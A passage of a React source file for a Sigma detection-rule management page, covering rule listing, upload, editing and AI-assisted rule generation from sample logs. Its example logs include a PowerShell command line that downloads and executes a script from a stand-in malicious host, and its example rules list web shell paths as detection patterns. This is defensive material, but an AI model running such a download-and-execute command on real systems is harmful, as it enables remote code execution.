import { Search as SearchIcon, RefreshCw as RefreshIcon, Upload as UploadIcon, Trash2 as DeleteIcon, Eye as VisibilityIcon, Shield as SecurityIcon, Download as DownloadIcon, Plus as AddIcon, Pencil as EditIcon, Wand2 as AutoFixHighIcon, CloudDownload as CloudDownloadIcon, AlertTriangle as WarningAmberIcon } from 'lucide-react';
import { useState, useEffect, useCallback } from 'react';
import {
  Box,
  Typography,
  Button,
  TextField,
  InputAdornment,
  CircularProgress,
  Card,
  CardContent,
  Chip,
  IconButton,
  Tooltip,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
} from '@mui/material';
import { toast } from '@/lib/toast';
import { askAI } from '@/services/ai';
import { deleteFile, getFileDownloadUrl, formatFileSize, ShuffleFile, createAndUploadFile } from '@/services/files';
import { Table, TableHeader, TableBody, TableRow, TableHead, TableCell } from '@/components/ui/table';
import { getApiUrl, getAuthHeader, API_CONFIG } from '@/Shuffle-Core/api';
import { Link } from '@/lib/router-compat';
import WebhookStatusBanner from '@/components/detection/WebhookStatusBanner';
import { usePageMeta } from '@/hooks/usePageMeta';

const SIGMA_NAMESPACE = 'sigma';

const EXAMPLE_LOGS = [
  {
    label: 'PowerShell Download',
    log: `EventID: 1
CommandLine: powershell.exe -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')"
ParentImage: C:\\Windows\\explorer.exe
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
User: CORP\\jdoe
LogonId: 0x3E7`,
  },
  {
    label: 'Suspicious SSH Login',
    log: `timestamp: 2024-12-15T03:22:41Z
source: sshd
message: Failed password for root from 203.0.113.42 port 52341 ssh2
facility: auth
severity: warning
hostname: prod-web-01`,
  },
  {
    label: 'AWS S3 Public Access',
    log: `{"eventVersion":"1.08","eventSource":"s3.amazonaws.com","eventName":"PutBucketPolicy","awsRegion":"us-east-1","sourceIPAddress":"198.51.100.23","userAgent":"aws-cli/2.13.0","requestParameters":{"bucketName":"sensitive-data-bucket","policy":"{\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Principal\\":\\"*\\",\\"Action\\":\\"s3:GetObject\\"}]}"},"userIdentity":{"arn":"arn:aws:iam::123456789012:user/admin"}}`,
  },
  {
    label: 'Windows RDP Brute Force',
    log: `EventID: 4625
LogName: Security
TargetUserName: Administrator
IpAddress: 10.0.0.55
LogonType: 10
FailureReason: %%2313
SubStatus: 0xC000006A
WorkstationName: ATTACKER-PC`,
  },
];

const EXAMPLE_RULES = [
  {
    label: 'Process Creation',
    content: `title: Suspicious Process Creation
id: 
status: experimental
level: high
description: Detects suspicious process creation patterns
author: SOC Team
date: ${new Date().toISOString().split('T')[0]}
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
    ParentImage|endswith:
      - '\\winword.exe'
      - '\\excel.exe'
  condition: selection
falsepositives:
  - Legitimate macro usage`,
  },
  {
    label: 'Firewall Block',
    content: `title: Repeated Firewall Denies from Single Source
id: 
status: experimental
level: medium
description: Detects a single source IP generating multiple firewall deny events
author: SOC Team
date: ${new Date().toISOString().split('T')[0]}
logsource:
  category: firewall
detection:
  selection:
    action: denied
  condition: selection | count(src_ip) by src_ip > 50
  timeframe: 5m
falsepositives:
  - Misconfigured applications
  - Network scanners`,
  },
  {
    label: 'Web Shell Access',
    content: `title: Web Shell Detection via URI Pattern
id: 
status: experimental
level: critical
description: Detects access to known web shell paths
author: SOC Team
date: ${new Date().toISOString().split('T')[0]}
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains:
      - '/cmd.asp'
      - '/shell.php'
      - '/c99.php'
      - '/r57.php'
    sc-status: 200
  condition: selection
falsepositives:
  - Penetration testing`,
  },
];

interface DetectionInfo {
  id: string;
  file_id: string;
  name: string;
  title?: string;
  description?: string;
  status?: string;
  level?: string;
  author?: string;
  created_at?: number;
  updated_at?: number;
  tags?: string[];
  logsource?: {
    category?: string;
    product?: string;
  };
  [key: string]: any;
}

const SIGMA_TEMPLATE = `title: New Detection Rule
id: 
status: experimental
level: medium
description: |
  Describe what this rule detects
author: Your Name
date: ${new Date().toISOString().split('T')[0]}
references:
  - https://example.com/reference
tags:
  - attack.execution
  - attack.t1059
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'suspicious_string'
  condition: selection
falsepositives:
  - Legitimate administrative activity
`;

const RulesPage = () => {

  usePageMeta({
    title: 'Sigma rules',
    description: 'Manage Sigma detection rules with AI-assisted authoring.',
    url: '/detection/sigma',
  });
  const [files, setFiles] = useState<ShuffleFile[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedFile, setSelectedFile] = useState<ShuffleFile | null>(null);
  const [fileContent, setFileContent] = useState<string>('');
  const [isViewDialogOpen, setIsViewDialogOpen] = useState(false);
  const [isContentLoading, setIsContentLoading] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  
  // Create/Edit dialog state
  const [isCreateDialogOpen, setIsCreateDialogOpen] = useState(false);
  const [editingFile, setEditingFile] = useState<ShuffleFile | null>(null);
  
  const [ruleContent, setRuleContent] = useState(SIGMA_TEMPLATE);
  const [sampleLog, setSampleLog] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  const [isSaving, setIsSaving] = useState(false);
  const [justGenerated, setJustGenerated] = useState(false);
  const [preAiContent, setPreAiContent] = useState<string | null>(null);
  const [loadingDefaultRules, setLoadingDefaultRules] = useState(false);
  const [hasValidSensor, setHasValidSensor] = useState(true);
  const [aiPrompt, setAiPrompt] = useState('');

  useEffect(() => {
    const checkSensors = async () => {
      try {
        const res = await fetch(getApiUrl('/api/v1/getenvironments'), {
          credentials: 'include',
          headers: { ...getAuthHeader() },
        });
        if (res.ok) {
          const envs = await res.json();
          const now = Math.floor(Date.now() / 1000);
          const valid = (envs as any[]).some(
            (e: any) => !e.archived && e.Type !== 'cloud' && e.checkin > 0 && (now - e.checkin) < 300
          );
          setHasValidSensor(valid);
        }
      } catch { /* ignore */ }
    };
    checkSensors();
  }, []);

  const loadDefaultRules = async () => {
    
    setLoadingDefaultRules(true);
    try {
      const response = await fetch(getApiUrl('/api/v1/files/download_remote'), {
        method: 'POST',
        credentials: 'include',
        headers: {
          ...getAuthHeader(),
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          url: 'https://github.com/shuffle/security-rules',
          path: 'sigma',
          field_3: 'main',
        }),
      });
      if (response.ok) {
        toast.success('Default rules loaded successfully');
        fetchDetections();
      } else {
        toast.error('Failed to load default rules');
      }
    } catch (error) {
      console.error('Error loading default rules:', error);
      toast.error('Error loading default rules');
    } finally {
      setLoadingDefaultRules(false);
    }
  };

  const fetchDetections = async () => {
    setIsLoading(true);
    try {
      const response = await fetch(getApiUrl('/api/v1/detections/Sigma'), {
        method: 'GET',
        credentials: 'include',
        headers: {
          ...getAuthHeader(),
          'Content-Type': 'application/json',
        },
      });

      if (!response.ok) {
        throw new Error(`Failed to fetch detections: ${response.status}`);
      }

      const data = await response.json();
      const detections: DetectionInfo[] = data.detection_info || [];
      
      // Map detection_info to ShuffleFile-like structure for compatibility
      const mappedFiles: ShuffleFile[] = detections.map((d) => ({
        ...d, // Include all original detection fields
        id: d.file_id || d.id || d.name,
        filename: d.title || d.name || 'Untitled',
        filesize: 0,
        created_at: d.created_at || 0,
        updated_at: d.updated_at || d.created_at || 0,
        namespace: SIGMA_NAMESPACE,
        labels: [
          ...(d.level ? [d.level] : []),
          ...(d.status ? [d.status] : []),
          ...(d.logsource?.product ? [d.logsource.product] : []),
        ],
        org_id: '',
        workflow_id: '',
        md5_sum: '',
        status: d.status || '',
        description: d.description || '',
      }));

      setFiles(mappedFiles);
    } catch (error) {
      console.error('Failed to fetch Sigma detections:', error);
      toast.error('Failed to load Sigma detections');
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchDetections();
  }, []);

  const filteredFiles = files.filter((file) =>
    file.filename.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const handleViewFile = async (file: ShuffleFile) => {
    setSelectedFile(file);
    setIsViewDialogOpen(true);
    setIsContentLoading(true);
    
    try {
      const url = getFileDownloadUrl(file.id);
      const response = await fetch(url, {
        credentials: 'include',
        headers: { ...getAuthHeader() },
      });
      
      if (response.ok) {
        const content = await response.text();
        setFileContent(content);
      } else {
        setFileContent('Failed to load file content');
      }
    } catch (error) {
      console.error('Failed to fetch file content:', error);
      setFileContent('Error loading file content');
    } finally {
      setIsContentLoading(false);
    }
  };

  const handleDeleteFile = async (file: ShuffleFile) => {
    if (!confirm(`Are you sure you want to delete "${file.filename}"?`)) {
      return;
    }

    try {
      const result = await deleteFile(file.id);
      if (result.success) {
        // After deleting, disable then re-enable all rules to sync backend state
        try {
          await fetch(getApiUrl('/api/v1/detections/sigma/selected_rules/disable_folder'), {
            method: 'PUT',
            credentials: 'include',
            headers: { ...getAuthHeader() },
          });
          await new Promise(resolve => setTimeout(resolve, 2000));
          await fetch(getApiUrl('/api/v1/detections/sigma/selected_rules/enable_folder'), {
            method: 'PUT',
            credentials: 'include',
            headers: { ...getAuthHeader() },
          });
        } catch (syncError) {
          console.warn('Failed to sync rules after deletion:', syncError);
        }
        toast.success(`Deleted ${file.filename}`);
        fetchDetections();
      } else {
        toast.error('Failed to delete file');
      }
    } catch (error) {
      console.error('Failed to delete file:', error);
      toast.error('Failed to delete file');
    }
  };

  const handleUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const uploadedFiles = event.target.files;
    if (!uploadedFiles || uploadedFiles.length === 0) return;

    setIsUploading(true);
    let successCount = 0;
    let failCount = 0;

    for (const file of Array.from(uploadedFiles)) {
      try {
        const result = await createAndUploadFile(file, SIGMA_NAMESPACE, ['sigma', 'detection']);
        if (result.success) {
          successCount++;
        } else {
          failCount++;
          console.error(`Failed to upload ${file.name}:`, result.reason);
        }
      } catch (error) {
        failCount++;
        console.error(`Failed to upload ${file.name}:`, error);
      }
    }

    setIsUploading(false);
    
    if (successCount > 0) {
      toast.success(`Uploaded ${successCount} file${successCount > 1 ? 's' : ''}`);
      fetchDetections();
    }
    if (failCount > 0) {
      toast.error(`Failed to upload ${failCount} file${failCount > 1 ? 's' : ''}`);
    }

    // Reset the input
    event.target.value = '';
  };

  const formatDate = (timestamp: number) => {
    if (!timestamp) return '—';
    return new Date(timestamp * 1000).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  const handleOpenCreateDialog = () => {
    setEditingFile(null);
    setRuleContent('');
    setSampleLog('');
    setPreAiContent(null);
    setJustGenerated(false);
    setIsCreateDialogOpen(true);
  };

  const handleGenerateFromLog = async () => {
    if (!sampleLog.trim()) {
      toast.error('Paste a sample log first');
      return;
    }
    setIsGenerating(true);
    setPreAiContent(ruleContent); // Save current content for rollback
    try {
      const { success, result, error } = await askAI({
        query: `Generate a Sigma detection rule in valid YAML from this sample log. Only output the YAML, no explanation:\n\n${sampleLog}`,
      });
      if (success && result) {
        // Strip markdown fences if present
        const cleaned = result.replace(/^```(?:ya?ml)?\n?/i, '').replace(/\n?```$/i, '').trim();
        setRuleContent(cleaned);
        // Flash highlight on the rule content field
        setJustGenerated(true);
        setTimeout(() => setJustGenerated(false), 3000);
        toast.success('Rule generated and applied to Rule Content below ↓');
      } else {
        toast.error(error || 'Failed to generate rule');
        setPreAiContent(null); // Clear rollback on failure
      }
    } catch (e) {
      console.error('AI generation error:', e);
      toast.error('Failed to generate rule');
    } finally {
      setIsGenerating(false);
    }
  };

  const handleImproveWithAI = async () => {
    if (!ruleContent.trim() || !aiPrompt.trim()) {
      return;
    }
    setIsGenerating(true);
    if (preAiContent === null) setPreAiContent(ruleContent); // preserve original only on first AI edit
    const instruction = `Modify this Sigma detection rule according to the following instruction: "${aiPrompt.trim()}". Only output the updated YAML, no explanation:\n\n${ruleContent}`;
    try {
      const { success, result, error } = await askAI({ query: instruction });
      if (success && result) {
        const cleaned = result.replace(/^```(?:ya?ml)?\n?/i, '').replace(/\n?```$/i, '').trim();
        setRuleContent(cleaned);
        setJustGenerated(true);
        setTimeout(() => setJustGenerated(false), 3000);
        setAiPrompt('');
        toast.success('Rule updated by AI');
      } else {
        toast.error(error || 'Failed to improve rule');
        setPreAiContent(null);
      }
    } catch (e) {
      console.error('AI improve error:', e);
      toast.error('Failed to improve rule');
    } finally {
      setIsGenerating(false);
    }
  };

  const handleEditFile = async (file: ShuffleFile) => {
    setEditingFile(file);
    setSampleLog('');
    setAiPrompt('');
    setPreAiContent(null);
    setJustGenerated(false);
    setIsCreateDialogOpen(true);
    
    try {
      const response = await fetch(getApiUrl(`/api/v1/files/${file.id}/content`), {
        method: 'GET',
        credentials: 'include',
        headers: {
          ...getAuthHeader(),
        },
      });
      
      if (response.ok) {
        const content = await response.text();
        setRuleContent(content);
      } else {
        toast.error('Failed to load rule content');
        setRuleContent(SIGMA_TEMPLATE);
      }
    } catch (error) {
      console.error('Failed to fetch file content:', error);
      toast.error('Failed to load rule content');
      setRuleContent(SIGMA_TEMPLATE);
    }
  };

  const extractRuleName = (content: string): string => {
    const match = content.match(/^title:\s*(.+)$/m);
    return match ? match[1].trim().toLowerCase().replace(/\s+/g, '_') : '';
  };

  const handleSaveRule = async () => {
    if (!ruleContent.trim()) {
      toast.error('Please enter rule content');
      return;
    }

    const derivedName = extractRuleName(ruleContent);
    if (!derivedName) {
      toast.error('Rule must contain a "title:" field');
      return;
    }

    setIsSaving(true);

    try {
      if (editingFile) {
        // Update existing file using PUT /api/v1/files/{fileid}/edit
        const response = await fetch(getApiUrl(`/api/v1/files/${editingFile.id}/edit`), {
          method: 'PUT',
          credentials: 'include',
          headers: {
            ...getAuthHeader(),
            'Content-Type': 'text/plain',
          },
          body: ruleContent,
        });

        if (response.ok) {
          toast.success('Rule updated successfully');
          setIsCreateDialogOpen(false);
          fetchDetections();
        } else {
          const data = await response.json().catch(() => ({}));
          toast.error(data.reason || 'Failed to update rule');
        }
      } else {
        // Create new file
        const filename = derivedName.endsWith('.yml') ? derivedName : `${derivedName}.yml`;
        const blob = new Blob([ruleContent], { type: 'text/yaml' });
        const file = new File([blob], filename, { type: 'text/yaml' });

        const result = await createAndUploadFile(file, SIGMA_NAMESPACE, ['sigma', 'detection']);
        
        if (result.success) {
          toast.success('Rule created successfully');
          setIsCreateDialogOpen(false);
          fetchDetections();
        } else {
          toast.error(result.reason || 'Failed to save rule');
        }
      }
    } catch (error) {
      console.error('Failed to save rule:', error);
      toast.error('Failed to save rule');
    } finally {
      setIsSaving(false);
    }
  };

  return (
    <Box sx={{ p: 4, maxWidth: 1400, width: '100%', mx: 'auto' }}>
      {/* Webhook status */}
      <Box sx={{ mb: 3 }}>
        <WebhookStatusBanner />
      </Box>
      {/* Header */}
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', mb: 4 }}>
        <Box>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, mb: 1 }}>
            <SecurityIcon size={28} style={{ color: 'hsl(var(--primary))' }} />
            <Typography variant="h4" sx={{ fontWeight: 600, color: 'hsl(var(--foreground))' }}>
              Detection Rules
            </Typography>
            
          </Box>
          <Typography sx={{ color: 'hsl(var(--muted-foreground))' }}>
            Manage Sigma detection rules for threat hunting and alerting
          </Typography>
        </Box>
        <Box sx={{ display: 'flex', gap: 1 }}>
          <Tooltip title="Default Rules">
            <Button
              variant="outlined"
              startIcon={loadingDefaultRules ? <CircularProgress size={16} color="inherit" /> : <CloudDownloadIcon />}
              onClick={loadDefaultRules}
              disabled={loadingDefaultRules}
              sx={{
                height: 36,
                borderColor: 'hsl(var(--border))',
                color: 'hsl(var(--foreground))',
                '&:hover': {
                  borderColor: 'hsl(var(--border))',
                  backgroundColor: 'hsl(var(--muted))',
                },
              }}
            >
              Default Rules
            </Button>
          </Tooltip>
          <Tooltip title="Refresh">
            <IconButton
              onClick={fetchDetections}
              disabled={isLoading}
              sx={{
                width: 36,
                height: 36,
                borderRadius: 1,
                border: '1px solid hsl(var(--border))',
                color: 'hsl(var(--foreground))',
                '&:hover': {
                  backgroundColor: 'hsl(var(--muted))',
                },
              }}
            >
              <RefreshIcon size={20} />
            </IconButton>
          </Tooltip>
          <Tooltip title="Upload rules">
            <IconButton
              component="label"
              disabled={isUploading}
              sx={{
                width: 36,
                height: 36,
                borderRadius: 1,
                border: '1px solid hsl(var(--border))',
                color: 'hsl(var(--foreground))',
                '&:hover': {
                  backgroundColor: 'hsl(var(--muted))',
                },
              }}
            >
              {isUploading ? <CircularProgress size={16} color="inherit" /> : <UploadIcon size={20} />}
              <input
                type="file"
                hidden
                multiple
                accept=".yml,.yaml,.sigma"
                onChange={handleUpload}
              />
            </IconButton>
          </Tooltip>
          <Button
            variant="contained"
            startIcon={<AddIcon />}
            onClick={handleOpenCreateDialog}
            sx={{
              height: 36,
              backgroundColor: 'hsl(var(--primary))',
              '&:hover': {
                backgroundColor: 'hsl(var(--primary) / 0.9)',
              },
            }}
          >
            Create Rule
          </Button>
        </Box>
      </Box>

      {/* No sensor warning */}
      {!hasValidSensor && (
        <Box sx={{
          mb: 3,
          p: 2,
          borderRadius: 2,
          display: 'flex',
          alignItems: 'center',
          gap: 1.5,
          backgroundColor: 'hsla(var(--primary) / 0.08)',
          border: '1px solid hsla(var(--primary) / 0.2)',
        }}>
          <WarningAmberIcon size={20} style={{ color: 'hsl(var(--primary))' }} />
          <Typography sx={{ fontSize: '0.85rem', color: 'hsl(var(--foreground))', flex: 1 }}>
            No Log Ingestion is running. Rules are uploaded but won't be active until Log Ingestion is running.
          </Typography>
          <Button
            component={Link}
            to="/detection"
            size="small"
            sx={{ textTransform: 'none', fontWeight: 600, color: 'hsl(var(--primary))' }}
          >
            Go to Detection Setup →
          </Button>
        </Box>
      )}

      {/* Search + count */}
      <Box sx={{ display: 'flex', alignItems: 'center', gap: 2, mb: 3 }}>
        <TextField
          placeholder="Search rules..."
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          size="small"
          sx={{
            width: 320,
            '& .MuiOutlinedInput-root': {
              height: 36,
              backgroundColor: 'hsl(var(--muted))',
              '& fieldset': { borderColor: 'hsl(var(--border))' },
              '&:hover fieldset': { borderColor: 'hsl(var(--border))' },
              '&.Mui-focused fieldset': { borderColor: 'hsl(var(--primary))' },
            },
            '& .MuiOutlinedInput-input': {
              color: 'hsl(var(--foreground))',
              '&::placeholder': { color: 'hsl(var(--muted-foreground))', opacity: 1 },
            },
          }}
          InputProps={{
            startAdornment: (
              <InputAdornment position="start">
                <SearchIcon size={20} style={{ color: 'hsl(var(--muted-foreground))' }} />
              </InputAdornment>
            ),
          }}
        />
        <Chip
          label={`${files.length} rule${files.length !== 1 ? 's' : ''}`}
          size="small"
          sx={{
            height: 24,
            fontSize: '0.75rem',
            fontWeight: 600,
            backgroundColor: 'hsl(var(--muted))',
            color: 'hsl(var(--muted-foreground))',
            border: '1px solid hsl(var(--border))',
          }}
        />
      </Box>

      {/* Table */}
      {isLoading ? (
        <Box sx={{ display: 'flex', justifyContent: 'center', py: 12 }}>
          <CircularProgress size={32} sx={{ color: 'hsl(var(--primary))' }} />
        </Box>
      ) : filteredFiles.length === 0 ? (
        <Box sx={{ py: 4, textAlign: 'center' }}>
          <Typography sx={{ color: 'hsl(var(--muted-foreground))', fontSize: '0.9rem' }}>
            {searchQuery ? 'No rules match your search' : 'No rules uploaded yet. Upload .yml or .yaml files to get started.'}
          </Typography>
        </Box>
      ) : (
        <Box sx={{
          border: '1px solid hsl(var(--border))',
          borderRadius: 1.5,
          overflow: 'hidden',
        }}>
          <Table>
            <TableHeader>
              <TableRow className="border-b border-border hover:bg-transparent">
                <TableHead className="text-muted-foreground font-medium text-xs" style={{ width: '45%', maxWidth: 0 }}>Rule</TableHead>
                <TableHead className="text-muted-foreground font-medium text-xs w-[30%]">Labels</TableHead>
                <TableHead className="text-muted-foreground font-medium text-xs w-[25%] text-right">Actions</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {filteredFiles.map((file) => (
                <TableRow key={file.id} className="border-b border-border hover:bg-muted/50">
                  <TableCell className="py-3" style={{ maxWidth: 0 }}>
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
                      <SecurityIcon size={18} style={{ color: 'hsl(var(--primary))', flexShrink: 0 }} />
                      <Typography sx={{ fontSize: '0.85rem', fontWeight: 500, color: 'hsl(var(--foreground))', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                        {file.filename}
                      </Typography>
                    </Box>
                  </TableCell>
                  <TableCell className="py-3">
                    <Box sx={{ display: 'flex', gap: 0.5, flexWrap: 'wrap' }}>
                      {file.labels?.map((label) => (
                        <Chip
                          key={label}
                          label={label}
                          size="small"
                          sx={{
                            height: 22,
                            fontSize: '0.7rem',
                            fontWeight: 600,
                            backgroundColor: 'hsl(var(--muted))',
                            color: 'hsl(var(--muted-foreground))',
                            border: '1px solid hsl(var(--border))',
                          }}
                        />
                      ))}
                    </Box>
                  </TableCell>
                  <TableCell className="py-3">
                    <Box sx={{ display: 'flex', justifyContent: 'flex-end', gap: 0.5 }}>
                      <Tooltip title="Edit">
                        <IconButton
                          size="small"
                          onClick={() => handleEditFile(file)}
                          sx={{ color: 'hsl(var(--muted-foreground))', '&:hover': { color: '#FF6600' } }}
                        >
                          <EditIcon size={14} />
                        </IconButton>
                      </Tooltip>
                      <Tooltip title="Download">
                        <IconButton
                          size="small"
                          onClick={async () => {
                            try {
                              const response = await fetch(getFileDownloadUrl(file.id), {
                                credentials: 'include',
                                headers: getAuthHeader(),
                              });
                              if (!response.ok) throw new Error('Download failed');
                              const blob = await response.blob();
                              const url = URL.createObjectURL(blob);
                              const a = document.createElement('a');
                              a.href = url;
                              a.download = file.filename.endsWith('.yml') ? file.filename : `${file.filename}.yml`;
                              document.body.appendChild(a);
                              a.click();
                              document.body.removeChild(a);
                              URL.revokeObjectURL(url);
                            } catch (e) {
                              console.error('Download error:', e);
                              toast.error('Failed to download file');
                            }
                          }}
                          sx={{ color: 'hsl(var(--muted-foreground))' }}
                        >
                          <DownloadIcon size={14} />
                        </IconButton>
                      </Tooltip>
                      <Tooltip title="Delete">
                        <IconButton
                          size="small"
                          onClick={() => handleDeleteFile(file)}
                          sx={{ color: 'hsl(var(--muted-foreground))', '&:hover': { color: 'hsl(var(--destructive))' } }}
                        >
                          <DeleteIcon size={16} />
                        </IconButton>
                      </Tooltip>
                    </Box>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </Box>
      )}

      {/* View Dialog */}
      <Dialog
        open={isViewDialogOpen}
        onClose={() => setIsViewDialogOpen(false)}
        maxWidth="md"
        fullWidth
        PaperProps={{
          sx: {
            backgroundColor: 'hsl(var(--card))',
            border: '1px solid hsl(var(--border))',
            borderRadius: 2,
          },
        }}
      >
        <DialogTitle sx={{ 
          borderBottom: '1px solid hsl(var(--border))',
          color: 'hsl(var(--foreground))',
          display: 'flex',
          alignItems: 'center',
          gap: 1.5,
        }}>
          <SecurityIcon style={{ color: 'hsl(var(--primary))' }} />
          {selectedFile?.filename}
        </DialogTitle>
        <DialogContent sx={{ p: 0, mt: 0 }}>
          {isContentLoading ? (
            <Box sx={{ display: 'flex', justifyContent: 'center', py: 8 }}>
              <CircularProgress size={32} sx={{ color: 'hsl(var(--primary))' }} />
            </Box>
          ) : (
            <Box
              component="pre"
              sx={{
                m: 0,
                p: 3,
                backgroundColor: 'hsl(var(--muted))',
                color: 'hsl(var(--foreground))',
                fontSize: '0.875rem',
                fontFamily: 'monospace',
                overflow: 'auto',
                maxHeight: 500,
                whiteSpace: 'pre-wrap',
                wordBreak: 'break-word',
              }}
            >
              {fileContent}
            </Box>
          )}
        </DialogContent>
        <DialogActions sx={{ borderTop: '1px solid hsl(var(--border))', px: 3, py: 2 }}>
          <Button
            onClick={() => setIsViewDialogOpen(false)}
            sx={{ color: 'hsl(var(--foreground))' }}
          >
            Close
          </Button>
        </DialogActions>
      </Dialog>

      {/* Create/Edit Dialog */}
      <Dialog
        open={isCreateDialogOpen}
        onClose={() => setIsCreateDialogOpen(false)}
        maxWidth="lg"
        fullWidth
        PaperProps={{
          sx: {
            backgroundColor: 'hsl(var(--card))',
            border: '1px solid hsl(var(--border))',
            borderRadius: 2,
            maxHeight: '90vh',
          },
        }}
      >
        <DialogTitle sx={{ 
          color: 'hsl(var(--foreground))',
          display: 'flex',
          alignItems: 'center',
          gap: 1.5,
        }}>
          <AddIcon style={{ color: 'hsl(var(--primary))' }} />
          {editingFile ? 'Edit Sigma Rule' : 'Create Sigma Rule'}
        </DialogTitle>
        <DialogContent sx={{ p: 3, display: 'flex', flexDirection: 'column', gap: 2.5 }}>
          {/* Sample Log + Generate — only for new rules */}
          {!editingFile && (
          <Box>
            <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 1 }}>
              <Typography variant="body2" sx={{ color: 'hsl(var(--muted-foreground))' }}>
                Sample Log
              </Typography>
              <Button
                size="small"
                variant="outlined"
                startIcon={isGenerating ? <CircularProgress size={14} color="inherit" /> : <AutoFixHighIcon size={14} />}
                onClick={handleGenerateFromLog}
                disabled={isGenerating || !sampleLog.trim()}
                sx={{
                  textTransform: 'none',
                  fontSize: '0.75rem',
                  borderColor: 'hsl(var(--border))',
                  color: 'hsl(var(--primary))',
                  '&:hover': { borderColor: 'hsl(var(--primary))', bgcolor: 'hsl(var(--primary) / 0.08)' },
                }}
              >
                {isGenerating ? 'Generating…' : 'Generate Rule'}
              </Button>
            </Box>
            <TextField
              multiline
              rows={5}
              value={sampleLog}
              onChange={(e) => setSampleLog(e.target.value)}
              fullWidth
              placeholder="Paste a sample log entry here and click Generate to create a Sigma rule automatically…"
              sx={{
                '& .MuiOutlinedInput-root': {
                  backgroundColor: 'hsl(var(--muted))',
                  fontFamily: 'monospace',
                  fontSize: '0.8rem',
                  '& fieldset': { borderColor: 'hsl(var(--border))' },
                  '&:hover fieldset': { borderColor: 'hsl(var(--border))' },
                  '&.Mui-focused fieldset': { borderColor: 'hsl(var(--primary))' },
                },
                '& .MuiOutlinedInput-input': { color: 'hsl(var(--foreground))' },
              }}
            />
            <Box sx={{ display: 'flex', gap: 0.75, mt: 1, flexWrap: 'wrap' }}>
              <Typography variant="caption" sx={{ color: 'hsl(var(--muted-foreground))', mr: 0.5, lineHeight: '24px' }}>
                Examples:
              </Typography>
              {EXAMPLE_LOGS.map((ex) => (
                <Chip
                  key={ex.label}
                  label={ex.label}
                  size="small"
                  onClick={() => setSampleLog(ex.log)}
                  sx={{
                    height: 24,
                    fontSize: '0.7rem',
                    cursor: 'pointer',
                    backgroundColor: 'hsl(var(--muted))',
                    color: 'hsl(var(--muted-foreground))',
                    border: '1px solid hsl(var(--border))',
                    '&:hover': { backgroundColor: 'hsl(var(--muted) / 0.8)', borderColor: 'hsl(var(--muted-foreground) / 0.3)' },
                  }}
                />
              ))}
            </Box>
          </Box>
          )}
          <Box>
            <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 1 }}>
              <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                <Typography variant="body2" sx={{ color: 'hsl(var(--muted-foreground))' }}>
                  Rule Content (YAML)
                </Typography>
                {justGenerated && (
                  <Chip
                    label="✓ AI Generated"
                    size="small"
                    sx={{
                      height: 20,
                      fontSize: '0.65rem',
                      fontWeight: 600,
                      backgroundColor: 'hsl(142 76% 36% / 0.15)',
                      color: 'hsl(142 76% 36%)',
                      border: '1px solid hsl(142 76% 36% / 0.3)',
                      animation: 'fadeIn 0.3s ease-in',
                      '@keyframes fadeIn': { from: { opacity: 0 }, to: { opacity: 1 } },
                    }}
                  />
                )}
                {preAiContent !== null && (
                  <Chip
                    label="↩ Undo AI changes"
                    size="small"
                    onClick={() => {
                      setRuleContent(preAiContent);
                      setPreAiContent(null);
                      setJustGenerated(false);
                      toast.success('Reverted to previous content');
                    }}
                    sx={{
                      height: 20,
                      fontSize: '0.65rem',
                      fontWeight: 600,
                      cursor: 'pointer',
                      backgroundColor: 'hsl(var(--muted))',
                      color: 'hsl(var(--muted-foreground))',
                      border: '1px solid hsl(var(--border))',
                      '&:hover': { borderColor: 'hsl(var(--primary))', color: 'hsl(var(--primary))' },
                    }}
                  />
                )}
              </Box>
              {editingFile ? (
                <Box sx={{ display: 'flex', gap: 1, alignItems: 'center' }}>
                  <TextField
                    size="small"
                    value={aiPrompt}
                    onChange={(e) => setAiPrompt(e.target.value)}
                    placeholder="e.g. Add more false positives, broaden detection…"
                    onKeyDown={(e) => { if (e.key === 'Enter' && !e.shiftKey && aiPrompt.trim()) { e.preventDefault(); handleImproveWithAI(); } }}
                    sx={{
                      minWidth: 300,
                      '& .MuiOutlinedInput-root': {
                        height: 32,
                        fontSize: '0.8rem',
                        backgroundColor: 'hsl(var(--muted))',
                        '& fieldset': { borderColor: 'hsl(var(--border))' },
                        '&:hover fieldset': { borderColor: 'hsl(var(--border))' },
                        '&.Mui-focused fieldset': { borderColor: 'hsl(var(--primary))' },
                      },
                      '& .MuiOutlinedInput-input': {
                        color: 'hsl(var(--foreground))',
                        '&::placeholder': { color: 'hsl(var(--muted-foreground))', opacity: 1 },
                      },
                    }}
                  />
                  <Button
                    size="small"
                    variant="outlined"
                    startIcon={isGenerating ? <CircularProgress size={14} color="inherit" /> : <AutoFixHighIcon size={14} />}
                    onClick={handleImproveWithAI}
                    disabled={isGenerating || !ruleContent.trim() || !aiPrompt.trim()}
                    sx={{
                      textTransform: 'none',
